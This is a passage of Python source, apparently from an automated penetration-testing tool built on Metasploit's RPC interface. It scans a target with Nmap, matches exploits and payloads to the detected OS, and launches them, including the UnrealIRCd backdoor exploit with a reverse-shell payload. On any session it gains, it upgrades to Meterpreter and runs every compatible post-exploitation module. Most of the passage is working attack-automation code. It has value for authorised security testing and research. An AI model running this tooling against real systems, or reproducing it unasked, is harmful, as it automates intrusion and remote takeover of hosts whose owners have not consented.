        send_status_update(self.username, {"system": self.rhost, "statusText": "Fetching Scan Results", "mode": "Running"})
        self.import_nmap_results()
        send_status_update(self.username, {"system": self.rhost, "statusText": 'Generating exploit tree for target', "mode": "Running"})
        self.get_exploit_tree_for_target()
        try:
            self.get_target_info()
        except Exception as e:
            self.store_to_db()
            self.util.print_message(FAIL, str(e))
            return
        
        # self.test_exploit("exploit/unix/irc/unreal_ircd_3281_backdoor", "cmd/unix/reverse_ruby", "6697", "0")
        # return
        
        self.sessions_list = []
        keys = self.target_tree.keys()
        print("All Ports List:" + str(keys))
        for key in keys:
            try:
                _ = int(key)  # Test if it is a valid port number
            except Exception as ex:
                print(ex)
                continue
            self.util.print_message(
                NOTE, "Trying to enter using port " + key + "...")
            for exploit in self.target_tree[key]['exploit']:
                if not (exploit == "exploit/unix/irc/unreal_ircd_3281_backdoor"):
                    continue
                if exploit[8:] not in self.exploit_tree.keys():
                    continue
                self.util.print_message(
                    NOTE, "Attacking using exploit " + exploit[8:] + "...")
                for target in self.exploit_tree[exploit[8:]]['target_list']:
                    # payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    # TODO target vs targets check key in exploit_tree.json
                    payload_list = self.exploit_tree[exploit[8:]
                                                     ]['target'][target]
                    payload_list = self.extract_osmatch_payload(payload_list)
                    payload_list.append("")
                    # Currently Executing all payload, Here any ML or AI model will be used to select optimal payload
                    for payload in payload_list:
                        if not (payload == "cmd/unix/reverse"):
                            continue
                        self.client.keep_alive()
                        target_info = self.set_target_info(
                            key, exploit, int(target))
                        self.util.print_message(NOTE, "Target Info: {}, Target: {}, Payload: {}".format(
                            target_info, target, payload))
                        send_status_update(self.username, {"system": self.rhost, "statusText": 'Trying to enter using ' + exploit + '(' + payload+ ') on port ' + str(key), "mode": "Running"})
                        result = self.execute_exploit(
                            payload, target, target_info)
                        if result is not None:
                            exploit_log = {"username": self.msgrpc_user, "localip": self.rhost, "exploit": exploit, "payload": payload, "engine": "Metasploit", "port": str(key), "success": True, "result": result}
                            if DEBUG:
                                print(str(exploit_log))
                            self.db_exploitation_logs.append(exploit_log)
                            self.util.print_message(NOTE, "Got a session")
                            send_status_update(self.username, {"system": self.rhost, "statusText": 'Got a Session using ' + exploit + '(' + payload+ ') on port ' + str(key), "mode": "Running"})
        
        # Store Data to DB after Exploitation is done
        self.store_to_db()
        if(len(self.sessions_list) == 0):
            self.util.print_message(
                FAIL, "Got no session. Exploitation Failed...")
        else:
            self.util.print_message(
                OK, "Bingo! Got " + str(len(self.sessions_list)) + " session(s).")
            for session in self.sessions_list:
                print(str(session) + "\n\n")
                send_status_update(self.username, {"system": self.rhost, "statusText": "Starting post exploitation on Session " + str(session['session_id']), "mode": "Running"})
                self.do_post_exploitation(session)
                send_status_update(self.username, {"system": self.rhost, "statusText": "Terminating Session " + str(session['session_id']), "mode": "Running"})
                self.client.stop_session(session['session_id'])
        # print("SWITCHING TO TESTING MODE FOR POST-EXPLOITATION TESTING")
        # self.test_postexploitation()
        
        # Terminate Current Console
        send_status_update(self, username, {"system": self.rhost, "statusText": "Cleaning Up", "mode": "Running"})
        self.client.termination(self.client.console_id)


    def test_postexploitation(self):
        while True:
            print("Sessions List")
            print(self.sessions_list)
            session = int(input("Enter a Session ID: "))
            self.do_post_exploitation(self.sessions_list[session])
    
    def get_post_exploit_tree(self, modules, session):
        post_exploit_tree = {}
        for i,post_exploit in enumerate(modules):
            try:
                temp_post_exploit_tree = {}

                # Set Exploit
                use_cmd = 'use post/' + post_exploit + '\n'
                _ = self.client.send_command(
                    self.client.console_id, use_cmd, False)

                # Get Options
                options = self.client.get_module_options('post', post_exploit)
                if DEBUG:
                    print("DEBUG: " + str(options))
                if b'error' in options:
                    self.util.print_message(WARNING, options[b'error_message'].decode('utf-8'))
                    continue
                key_list = options.keys()
                option = {}
                # print(key_list)
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    # print(sub_key_list)
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            # print(options[key][sub_key])
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode(
                                    'utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode(
                                    'utf-8')] = options[key][sub_key]
                    if key == b'SESSION' or key == 'SESSION':
                        sub_option['user_specify'] = session
                    else:
                        sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option
                

                # Add payloads and targets to exploit tree
                temp_post_exploit_tree['options'] = option
                post_exploit_tree[post_exploit] = temp_post_exploit_tree
                self.util.print_message(OK, '{}/{} post-exploit:{}'.format(str(i + 1),
                                                                                len(
                                                                                    modules),
                                                                                post_exploit))
            except KeyError:
                # Skip this Exploit
                self.util.print_message(WARNING, '{}/{} post-exploit:{}'.format(str(i + 1),
                                                                                len(
                                                                                    modules),
                                                                                post_exploit))
        return post_exploit_tree

    def do_post_exploitation(self, session):
        post_results = {
            "meterpreter": False,
            "env": "",
            "vm": "",
            "container": ""
        }
        session_id = int(session['session_id'])
        send_status_update(self.username, {"system": self.rhost, "statusText": "Trying to upgrade shell to meterpreter", "mode": "Running"})
        result = self.client.upgrade_shell_session(session_id, self.lhost, self.lport)
        if DEBUG:
            print("Session Upgrade Result " + str(result))
        if result == 'success':
            # Store that meterpreter shell is possible
            send_status_update(self.username, {"system": self.rhost, "statusText": "Got Meterpreter Shell", "mode": "Running"})
            post_results['meterpreter'] = True
            session_id += 1
        else:
            # Currently returing but can do something else for non-meterpreter shell
            send_status_update(self.username, {"system": self.rhost, "statusText": "Failed to get Meterpreter Shell", "mode": "Running"})
            post_results['meterpreter'] = False
        
        # Execute all possible Post Exploit Modules
        results = self.client.get_session_compatible_module(session_id)
        if results is None:
            if DEBUG:
                print("Failed")
        else:
            # results = map(convert_bytes_string_to_utf8_string, results)
            results = [x.decode('utf-8') for x in results]
            modules = [module[5:] for module in results]
            modules = self.os_match_post_modules(modules)
            if DEBUG:
                print(modules)
            post_modules_options = self.get_post_exploit_tree(modules, session_id)
            if DEBUG:
                print(post_modules_options)
            for module in modules:
                self.util.print_message(NOTE, "Executing " + str(module))
                options = post_modules_options[module]['options']
                self.execute_post_exploit(module, options)
                ret = self.client.call('console.read', [self.client.console_id])
                print(ret)
            # if DEBUG:
            #     print(str(results))
            # for postmod in results:
            #     postmod = postmod.decode('utf-8')
            #     self.util.print_message(NOTE, "Executing " + postmod)
            #     result = self.client.execute_meterpreter(session_id, "run " + postmod)
            #     if DEBUG:
            #         print("Execute Result: " + str(result))
            #     time.sleep(1.0)
            #     result = self.client.get_meterpreter_result(session_id)
            #     if DEBUG:
            #         print("Output: " + str(result))
        
            

            



    def test_exploit(self, exploit, payload, port, target):
        target_info = self.set_target_info(port, exploit, target)
        self.util.print_message(NOTE, "Target Info: {}, Target: {}, Payload: {}".format(
            target_info, target, payload))
        result = self.execute_exploit(payload, target, target_info)
        if result is not None:
            self.util.print_message(NOTE, "Got a session")
            print(result)

    # Check status of running module.
    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message(
                    WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

    def set_target_info(self, port_num, exploit, target):

        # Get product name.
        service_name = self.target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return None

        target_info = {'protocol': self.target_tree[port_num]['protocol'],
                       'target_path': self.target_tree[port_num]['target_path'],
                       'prod_name': service_name, 'version': self.target_tree[port_num]['version'],
                       'exploit': exploit[8:], 'target': target, 'port': str(port_num)}

        return target_info

    def set_options(self, target_info, target, selected_payload):
        options = self.exploit_tree[target_info['exploit']]['options']
        key_list = options.keys()
        option = {}
        for key in key_list:
            if options[key]['required'] is True:
                sub_key_list = options[key].keys()
                if 'default' in sub_key_list:
                    if options[key]['user_specify'] == '':
                        option[key] = options[key]['default']
                    else:
                        option[key] = options[key]['user_specify']
                else:
                    option[key] = '0'  # Blind Value
            # Set target path/uri/dir etc.
            if len([s for s in self.path_collection if s in key.lower()]) != 0:
                option[key] = target_info['target_path']

        option['RHOST'] = self.rhost
        if self.port_div_symbol in target_info['port']:
            tmp_port = target_info['port'].split(self.port_div_symbol)
            option['RPORT'] = int(tmp_port[0])
        else:
            option['RPORT'] = int(target_info['port'])

        option['TARGET'] = int(target)

        if selected_payload != '':
            option['PAYLOAD'] = selected_payload
            option['LPORT'] = self.lport
            option['LHOST'] = self.lhost
        return option

    def set_post_exploit_options(self, options: dict):
        key_list = options.keys()
        option = {}
        for key in key_list:
            if options[key]['required'] is True:
                sub_key_list = options[key].keys()
                if 'default' in sub_key_list:
                    if options[key]['user_specify'] == '':
                        option[key] = options[key]['default']
                    else:
                        option[key] = options[key]['user_specify']
                else:
                    option[key] = '0'  # Blind Value
            # Set target path/uri/dir etc.
            # if len([s for s in self.path_collection if s in key.lower()]) != 0:
            #     option[key] = target_info['target_path']

        # option['RHOST'] = self.rhost
        # if self.port_div_symbol in target_info['port']:
        #     tmp_port = target_info['port'].split(self.port_div_symbol)
        #     option['RPORT'] = int(tmp_port[0])
        # else:
        #     option['RPORT'] = int(target_info['port'])

        # option['TARGET'] = int(target)

        # if selected_payload != '':
        #     option['PAYLOAD'] = selected_payload
        option['LPORT'] = self.lport
        option['LHOST'] = self.lhost
        if DEBUG:
            print(option)
        return option

    def scan_the_target(self):
        self.util.print_message(
            NOTE, 'Execute Nmap against {}'.format(self.rhost))

        command = self.nmap_command + ' ' + \
            self.nmap_result_file + ' ' + self.rhost + '\n'
        timeout = self.nmap_timeout
        # Execute Nmap.
        self.util.print_message(OK, '{}'.format(command))
        self.util.print_message(
            OK, 'Start time: {}'.format(self.util.get_current_date()))
        _ = self.client.call(
            'console.write', [self.client.console_id, command])

        time.sleep(3.0)
        time_count = 0
        while True:
            # Judgement of Nmap finishing.
            ret = self.client.call('console.read', [self.client.console_id])
            try:
                if (time_count % 5) == 0:
                    self.util.print_message(
                        OK, 'Port scanning: {} [Elapsed time: {} s]'.format(self.rhost, time_count))
                    self.client.keep_alive()
                if timeout == time_count:
                    self.client.termination(self.client.console_id)
                    self.util.print_message(
                        OK, 'Timeout   : {}'.format(command))
                    self.util.print_message(
                        OK, 'End time  : {}'.format(self.util.get_current_date()))
                    break

                status = ret.get(b'busy')
                if status is False:
                    self.util.print_message(
                        OK, 'End time  : {}'.format(self.util.get_current_date()))
                    time.sleep(5.0)
                    break
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(command))
            time.sleep(1.0)
            time_count += 1

        _ = self.client.call('console.destroy', [self.client.console_id])
        ret = self.client.call('console.create', [])
        try:
            self.client.console_id = ret.get(b'id')
        except Exception as e:
            self.util.print_exception(e, 'Failed: console.create')
            exit(1)
        _ = self.client.call('console.read', [self.client.console_id])
    
    def import_nmap_results(self):
        self.util.print_message(NOTE, "Importing NMAP XML Output")
        self.client.send_command(self.client.console_id, "db_import " + self.nmap_result_file + "\n", False)
        time.sleep(2.0)

    def get_exploit_tree_for_target(self):
        exploit_tree = {}
        self.load_exploit_list()

        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is not False:
            # Get exploit tree from local file.
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            self.util.print_message(
                OK, 'Loaded exploit tree from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            self.exploit_tree = exploit_tree
            return

        for i, exploit in enumerate(MetasploitCannon.all_exploit_list):
            try:
                temp_target_tree = {'targets': []}
                temp_tree = {}

                # Set Exploit
                use_cmd = 'use exploit/' + exploit + '\n'
                _ = self.client.send_command(
                    self.client.console_id, use_cmd, False)

                # Get Target
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0
                while True:
                    target_info = self.client.send_command(
                        self.client.console_id, show_cmd, False)
                    if 'Exploit targets' in target_info:
                        break
                    if time_count == 5:
                        self.util.print_message(
                            OK, 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message(OK, 'No Target exists.')
                        break
                    time.sleep(1.0)
                    time_count += 1
                target_list = self.cutting_strings(
                    r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                for target in target_list:
                    # Get payload list
                    payload_list = self.client.get_target_compatible_payload_list(
                        exploit, int(target))
                    temp_tree[target] = payload_list

                # Get Options
                options = self.client.get_module_options('exploit', exploit)
                if DEBUG:
                    print("DEBUG: " + str(options))
                if b'error' in options:
                    self.util.print_message(WARNING, options[b'error_message'].decode('utf-8'))
                    continue
                key_list = options.keys()
                option = {}
                # print(key_list)
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    # print(sub_key_list)
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            # print(options[key][sub_key])
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode(
                                    'utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode(
                                    'utf-8')] = options[key][sub_key]
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option
                

                # Add payloads and targets to exploit tree
                temp_target_tree['target_list'] = target_list
                temp_target_tree['target'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree
                self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(i + 1),
                                                                                len(
                                                                                    MetasploitCannon.all_exploit_list),
                                                                                exploit,
                                                                                len(target_list)))
            except KeyError:
                # Skip this Exploit
                self.util.print_message(WARNING, '{}/{} exploit:{}, targets:{}'.format(str(i + 1),
                                                                                len(
                                                                                    MetasploitCannon.all_exploit_list),
                                                                                exploit,
                                                                                len(target_list)))
        self.exploit_tree = exploit_tree
        # Save exploit tree to local file.
        fout = codecs.open(os.path.join(
            self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
        json.dump(exploit_tree, fout, indent=4)
        fout.close()
        self.util.print_message(OK, 'Saved exploit tree.')
    # Parse.

    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    def load_exploit_list(self):
        while(MetasploitCannon.loading_exploit_list):
            time.sleep(0.1)
        if(len(MetasploitCannon.all_exploit_list) > 0):
            return
        MetasploitCannon.loading_exploit_list = True
        if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is not False:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            self.util.print_message(
                OK, 'Loaded exploit list from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                MetasploitCannon.all_exploit_list.append(item.rstrip('\n'))
            fin.close()
            MetasploitCannon.loading_exploit_list = False
            return

        raw_exploit_list = self.client.get_module_list('exploit')
        for i, exploit in enumerate(raw_exploit_list):
            mod_info = self.client.get_module_info('exploit', exploit)
            time.sleep(0.1)
            try:
                rank = mod_info[b'rank'].decode('utf-8')
                if rank in {'excellent', 'great' 'good'}:
                    MetasploitCannon.all_exploit_list.append(exploit)
                    self.util.print_message(
                        OK, 'Exploit {}/{} Loaded: {}'.format(i+1, len(raw_exploit_list), exploit))
                else:
                    self.util.print_message(
                        WARNING, 'Exploit {}/{} Skipped: {}'.format(i+1, len(raw_exploit_list), exploit))
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(mod_info))
        # Save Exploit module list to local file.
        self.util.print_message(OK, 'Total loaded exploit module: {}'.format(
            str(len(MetasploitCannon.all_exploit_list))))
        fout = codecs.open(os.path.join(
            self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
        for item in MetasploitCannon.all_exploit_list:
            fout.write(item + '\n')
        fout.close()
        self.util.print_message(OK, 'Saved exploit list.')
        MetasploitCannon.loading_exploit_list = False
    
    def load_post_exploit_list(self):
        while(MetasploitCannon.loading_post_exploit_list):
            time.sleep(0.1)
        if(len(MetasploitCannon.all_post_exploit_list) > 0):
            return
        MetasploitCannon.loading_post_exploit_list = True
        if os.path.exists(os.path.join(self.data_path, 'post_exploit_list.csv')) is not False:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'post_exploit_list.csv')
            self.util.print_message(
                OK, 'Loaded post exploit list from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                MetasploitCannon.all_post_exploit_list.append(item.rstrip('\n'))
            fin.close()
            MetasploitCannon.loading_post_exploit_list = False
            return

        raw_post_exploit_list = self.client.get_module_list('post')
        for i, post_exploit in enumerate(raw_post_exploit_list):
            mod_info = self.client.get_module_info('post', post_exploit)
            time.sleep(0.1)
            try:
                rank = mod_info[b'rank'].decode('utf-8')
                if rank in {'excellent', 'great' 'good'}:
                    MetasploitCannon.all_post_exploit_list.append(post_exploit)
                    self.util.print_message(
                        OK, 'Post-Exploit {}/{} Loaded: {}'.format(i+1, len(raw_post_exploit_list), post_exploit))
                else:
                    self.util.print_message(
                        WARNING, 'Post Exploit {}/{} Skipped: {}'.format(i+1, len(raw_post_exploit_list), post_exploit))
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(mod_info))
        # Save Exploit module list to local file.
        self.util.print_message(OK, 'Total loaded post exploit module: {}'.format(
            str(len(MetasploitCannon.all_post_exploit_list))))
        fout = codecs.open(os.path.join(
            self.data_path, 'post_exploit_list.csv'), 'w', 'utf-8')
        for item in MetasploitCannon.all_post_exploit_list:
            fout.write(item + '\n')
        fout.close()
        self.util.print_message(OK, 'Saved post exploit list.')
        MetasploitCannon.loading_post_exploit_list = False


    def get_payload_list(self, module_name='', target_num=''):
        self.util.print_message(NOTE, 'Get payload list.')
        payload_list = []
        if module_name == '':
            payload_list = self.client.get_module_list('payload')
            payload_list.append('no payload')
        elif target_num == '':
            payload_list = self.client.get_compatible_payload_list(module_name)
        else:
            payload_list = self.client.get_target_compatible_payload_list(
                module_name, target_num)
        return payload_list

    def get_nmap_xml_contents(self):
        return self.nmap_file_contents
        # TODO Use cat command and MsfRPC API to get File Contents

    def get_target_info(self):
        port_list, proto_list, port_info, closed_ports = None, None, None, None
        try:
            port_list, proto_list, port_info, closed_ports = self.get_scan_info()
        except Exception as e:
            # Insert these logs after Exploitation
            # DBHANDLE.insert_scanning_log(dict(), self.msgrpc_user, self.rhost, "Unknown", list())
            self.db_scanning_logs = {'openports': dict(), 'username': self.msgrpc_user, 'localip': self.rhost, 'os': "Unknown", "closed_ports": list()}
            self.db_exploitation_logs = []
            self.util.print_message(FAIL, str(e))
            raise e
        target_tree = {'rhost': self.rhost, 'os_type': self.os_real}

        # if os.path.exists(os.path.join(self.data_path, 'target_info_' + self.rhost + '.json')) is not False:
        #     # Get target host information from local file.
        #     saved_file = os.path.join(self.data_path, 'target_info_' + self.rhost + '.json')
        #     self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
        #     fin = codecs.open(saved_file, 'r', 'utf-8')
        #     target_tree = json.loads(fin.read().replace('\0', ''))
        #     fin.close()
        #     self.target_tree = target_tree
        #     return

        for port_idx, port_num in enumerate(port_list):
            temp_tree = {'prod_name': '', 'version': 0.0,
                         'protocol': '', 'target_path': '', 'exploit': []}

            # Get Product Name
            service_name = 'unknown'
            for(idx, service) in enumerate(self.service_list):
                if service in port_info[port_idx].lower():
                    service_name = service
                    break
            temp_tree['prod_name'] = service_name

            # Get Product Version
            regex_list = [r'.*\s(\d{1,3}\.\d{1,3}\.\d{1,3}).*',
                          r'.*\s[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3}).*',
                          r'.*\s[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3}).*',
                          r'.*\s[a-z]?(\d\.\d).*',
                          r'.*\s(\d\.[xX|\*]).*']

            version = 0.0
            output_version = 0.0

            for(idx, regex) in enumerate(regex_list):
                version_raw = self.cutting_strings(regex, port_info[port_idx])
                if len(version_raw) == 0:
                    continue
                if idx == 0:
                    index = version_raw[0].rfind('.')
                    version = version_raw[0][:index] + \
                        version_raw[0][index + 1:]
                    output_version = version_raw[0]
                    break
                elif idx == 1:
                    index = re.search(r'[a-z]', version_raw[0]).start()
                    version = version_raw[0][:index] + \
                        str(ord(version_raw[0][index])) + \
                        version_raw[0][index + 1:]
                    output_version = version_raw[0]
                    break
                elif idx == 2:
                    index = re.search(r'[a-z]', version_raw[0]).start()
                    version = version_raw[0][:index] + \
                        str(ord(version_raw[0][index])) + \
                        version_raw[0][index + 1:]
                    index = version.rfind('.')
                    version = version_raw[0][:index] + version_raw[0][index:]
                    output_version = version_raw[0]
                    break
                elif idx == 3:
                    version = self.cutting_strings(
                        r'[a-z]?(\d\.\d)', version_raw[0])
                    version = version[0]
                    output_version = version_raw[0]
                    break
                elif idx == 4:
                    version = version_raw[0].replace(
                        'X', '0').replace('x', '0').replace('*', '0')
                    version = version[0]
                    output_version = version_raw[0]
            temp_tree['version'] = float(version)

            # Get Protocol Type

            temp_tree['protocol'] = proto_list[port_idx]

            # Get Exploit Module
            module_list = []
            raw_module_info = ''
            idx = 0
            search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
            raw_module_info = self.client.send_command(
                self.client.console_id, search_cmd, False, 3.0)
            module_list = self.extract_osmatch_module(
                self.cutting_strings(r'(exploit/.*)', raw_module_info))
            if service_name != 'unknown' and len(module_list) == 0:
                self.util.print_message(
                    WARNING, 'Can\'t load exploit module: {}'.format(service_name))
                temp_tree['prod_name'] = 'unknown'

            for module in module_list:
                if module[1] in {'excellent', 'great', 'good'}:  # Checking Module Rank
                    temp_tree['exploit'].append(module[0])
            target_tree[str(port_num)] = temp_tree

        # Add target_tree to Database
        self.add_target_tree_to_database(target_tree, closed_ports)
        
        self.target_tree = target_tree

        # Save target host information to local file.
        fout = codecs.open(os.path.join(
            self.data_path, 'target_info_' + self.rhost + '.json'), 'w', 'utf-8')
        json.dump(target_tree, fout, indent=4)
        fout.close()
        self.util.print_message(OK, 'Saved target tree.')

    # Get target OS name.
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if self.os_real == 0 and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 4 and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 9 and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 10 and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 15:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list
    
    def os_match_post_modules(self, modules_list):
        osmatch_module_list = []
        for module in modules_list:
            os_type = module.split('/')[0]
            if self.os_real == 0 and os_type in ['windows', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 4 and os_type in ['netware', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 9 and os_type in ['firefox', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 10 and os_type in ['dialup', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append(module)
            elif self.os_real == 15:
                osmatch_module_list.append(module)
        return osmatch_module_list

    def extract_osmatch_payload(self, payload_list):
        os_match_payloads = []
        for payload in payload_list:
            tokens = set(payload.split('/'))
            if self.os_real == 0 and tokens & set(['windows', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 1 and tokens & set(['unix', 'freebsd', 'bsdi', 'linux', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 2 and tokens & set(['solaris', 'unix', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 3 and tokens & set(['osx', 'unix', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 4 and tokens & set(['netware', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 5 and tokens & set(['linux', 'unix', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 6 and tokens & set(['irix', 'unix', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 7 and tokens & set(['hpux', 'unix', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 8 and tokens & set(['freebsd', 'unix', 'bsdi', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 9 and tokens & set(['firefox', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 10 and tokens & set(['dialup', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 11 and tokens & set(['bsdi', 'unix', 'freebsd', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 12 and tokens & set(['apple_ios', 'unix', 'osx', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 13 and tokens & set(['android', 'linux', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 14 and tokens & set(['aix', 'unix', 'multi']):
                os_match_payloads.append(payload)
            elif self.os_real == 15:
                os_match_payloads.append(payload)
        return os_match_payloads

    def add_target_tree_to_database(self, target_tree: dict, closed_ports: list):
        openPorts: dict = copy.deepcopy(target_tree)
        del openPorts['rhost']
        del openPorts['os_type']
        for key in openPorts.keys():
            del openPorts[key]['target_path']
            del openPorts[key]['exploit']
        os = str(self.os_type[self.os_real])
        # self.scanningevent = DBHANDLE.insert_scanning_log(openPorts, self.msgrpc_user, self.rhost, os, closed_ports)['event']
        self.db_scanning_logs = {'openports': openPorts, 'username': self.msgrpc_user, 'localip': self.rhost, 'os': os, "closed_ports": closed_ports}





if __name__ == '__main__':
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    FlaskAPP = FlaskAPI()
    CORS(FlaskAPP)
    # APP = socketio.WSGIApp(socketIOServer, FlaskAPP)
    # # APP.wsgi_app.run()
    # eventlet.wsgi.server(eventlet.listen(('', 8080)), APP)
    FlaskAPP.wsgi_app = socketio.WSGIApp(socketIOServer, FlaskAPP.wsgi_app)
    FlaskAPP.run(host="0.0.0.0", port=8080, debug=False, threaded=True)